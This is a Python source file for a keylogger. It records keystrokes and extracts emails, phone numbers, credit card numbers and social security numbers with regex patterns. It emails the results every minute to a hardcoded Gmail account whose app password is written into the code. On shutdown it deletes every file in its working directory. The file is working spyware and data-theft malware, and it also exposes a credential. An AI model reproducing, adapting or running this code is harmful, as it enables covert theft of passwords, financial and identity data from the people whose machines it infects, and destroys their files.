# ===================================================== Basic keylogger ================================================

import keyboard
import os

# Defining the text file name and path
path = os.path.abspath("keysniffer_data.txt")


def keylogger():
    try:
        while True:
            with open(path, "a") as data_file:
                # All key presses are recorded as a list into "events"
                # and the record loop stops when the "enter" key is pressed
                events = keyboard.record("enter")
                password = list(keyboard.get_typed_strings(events))

                data_file.write("\n")  # New line written before data is written
                data_file.write(password[0])
    except KeyboardInterrupt:
        print("Keylogger stopped.")


# ===================================================== Filter and Extract Valuable Info ====================================

import re
from collections import Counter
import os


def extract_valuable_info(keysniffer_data, filtered_data):
    with open(keysniffer_data, "r") as file:
        data = file.read()

    # Define patterns for valuable information
    patterns = {
        # Updated email pattern to only accept emails ending with @gmail.com or @hotmail.com
        "emails": r"[\w.-]+@(gmail\.com|hotmail\.com)",
        # Phone numbers: expanded pattern for more global formats (e.g., international numbers)
        "phone_numbers": r"\+?\d{1,4}[-.\s]?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,9}",
        # URLs: added support for subdomains and optional trailing slash
        "urls": r"https?://[\w.-]+(?:\.[\w.-]+)+[/\w.-]*",
        # Credit cards: accept with or without spaces/dashes
        "credit_cards": r"\b(?:\d{4}[- ]?){3}\d{4}\b",
        # IP addresses: IPv4 pattern
        "ip_addresses": r"\b(?:\d{1,3}\.){3}\d{1,3}\b",
        # Dates: support multiple formats, including dots and European formats
        "dates": r"\b\d{4}[-/.]\d{2}[-/.]\d{2}\b|\b\d{2}[-/.]\d{2}[-/.]\d{4}\b|\b\d{2}[-/.]\d{2}[-/.]\d{2}\b",
        # Social Security Numbers: expanded example and comment
        "social_security_numbers": r"\b\d{3}[- ]?\d{2}[- ]?\d{4}\b",
    }

    # Examples for each pattern
    # emails: Example: johndoe@gmail.com, user@hotmail.com (only gmail.com or hotmail.com allowed)
    # phone_numbers: Example: +1-123-456-7890, (123) 456-7890, 123.456.7890
    # urls: Example: https://example.com, http://sub.example.co.uk/path
    # credit_cards: Example: 1234-5678-1234-5678, 1234567812345678
    # ip_addresses: Example: 192.168.1.1, 8.8.8.8
    # dates: Example: 2025-01-03, 01/03/2025, 03.01.2025
    # social_security_numbers: Example: 123-45-6789, 123 45 6789

    extracted_data = {}

    for key, pattern in patterns.items():
        matches = re.findall(pattern, data)
        extracted_data[key] = matches

    # Most common words typed
    words = re.findall(r"\b\w+\b", data)
    common_words = Counter(words).most_common(10)
    extracted_data["common_words"] = common_words

    # Verify if the output file exists, create it if not
    if not os.path.exists(filtered_data):
        with open(filtered_data, "w") as filtered_file:
            pass

    # Write the extracted data to the output file
    with open(filtered_data, "w") as filtered_file:
        for category, items in extracted_data.items():
            filtered_file.write(f"{category.capitalize()}:\n")
            for item in items:
                filtered_file.write(f"  {item}\n")
            filtered_file.write("\n")


# ===================================================== Sending the Filtered Data via Email ====================================

import smtplib
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

# Email sender and receiver details
password = "ixtzymqtphizlcet"
sender_email = "7unkym0nk3y@gmail.com"  # email from the account
receiver_email = "7unkym0nk3y@gmail.com"  # email from the sender

# File to attach
filtered_data_file = "valuable_info.txt"  # Now we're attaching the filtered data file


def send_email():
    # Create the email object
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "File Attachment: valuable_info.txt"

    # Email body
    email_body = """<html><body><p>Please find the attached file valuable_info.txt containing filtered data.</p></body></html>"""
    message.attach(MIMEText(email_body, "html"))

    # Attach the filtered data file
    with open(filtered_data_file, "rb") as file:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(file.read())
        encoders.encode_base64(part)
        part.add_header(
            "Content-Disposition",
            f"attachment; filename={filtered_data_file}",
        )
        message.attach(part)

    # Send the email
    try:
        with smtplib.SMTP(
            "smtp.gmail.com:587"
        ) as server:  # Replace with your SMTP server and port
            server.starttls()
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
            print("Email sent successfully.")
    except Exception as e:
        print(f"An error occurred: {e}")


def send_email_periodically():
    # Sends the filtered data file as an email attachment every 5 minutes.
    while True:
        send_email()
        time.sleep(60)  # Wait for 1 minutes


# ===================================================== Deleting All Files =====================================================


def delete_all_files():
    try:
        # Iterate through all items in the current directory
        for item in os.listdir("."):
            # Construct full path --> for the file

            file_path = os.path.join(".", item)
            # Check if it is a file and delete it
            if os.path.isfile(file_path):
                os.remove(file_path)
                print(f"Deleted: {file_path}")
    except Exception as e:
        print(f"An error occurred while deleting files: {e}")


# ===================================================== Running the Program ======================================================

import threading

# Run keylogger and send_email_periodically simultaneously using threads
if __name__ == "__main__":
    try:
        # Start the keylogger in one thread
        keylogger_thread = threading.Thread(target=keylogger, daemon=True)

        # Start the keylogger in another thread
        filter_thread = threading.Thread(
            target=extract_valuable_info,
            daemon=True,
            args=("keysniffer_data.txt", "valuable_info.txt"),
        )

        # Start the email sender in another thread
        email_thread = threading.Thread(target=send_email_periodically, daemon=True)

        filter_thread.start()
        keylogger_thread.start()
        email_thread.start()

        # Keep the main thread alive
        filter_thread.join()
        keylogger_thread.join()
        email_thread.join()

    except KeyboardInterrupt:
        print("Program stopped.")

    finally:
        delete_all_files()
